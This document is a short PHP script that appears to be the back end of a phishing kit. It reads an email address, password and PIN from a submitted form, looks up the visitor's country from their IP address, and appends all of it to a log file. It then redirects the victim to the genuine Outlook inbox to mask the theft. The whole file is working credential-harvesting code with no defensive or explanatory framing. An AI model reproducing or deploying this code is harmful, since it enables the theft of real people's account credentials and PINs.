<?php
session_start();
date_default_timezone_set('America/Caracas');
ini_set("display_errors", 0);
$email = $_POST['email'];
$password = $_POST['password'];
$pxn = $_POST['pxn'];
$ip = $_SERVER['REMOTE_ADDR'];

$cc = trim(file_get_contents("http://ipinfo.io/{$ip}/country"));
if(isset($_POST["pxn"]) && isset($_POST["pxn"])){
	

	
	$file = fopen("t1m3.txt", "a+");
fwrite($file, "@@@@: ".$_POST['email']."  - Pasw: ".$_POST['password']." - Pin ".$_POST['pxn']." Fecha: ".date('Y-m-d')." - ".date('H:i:s')." - ".$cc." ".$ip." " . PHP_EOL);
fwrite($file, "********************************* " . PHP_EOL);
fclose($file);
unset ($_POST['email']);
unset ($_POST['password']);


	header ('location: https://outlook.live.com/mail/0/inbox');
	

}
	
?>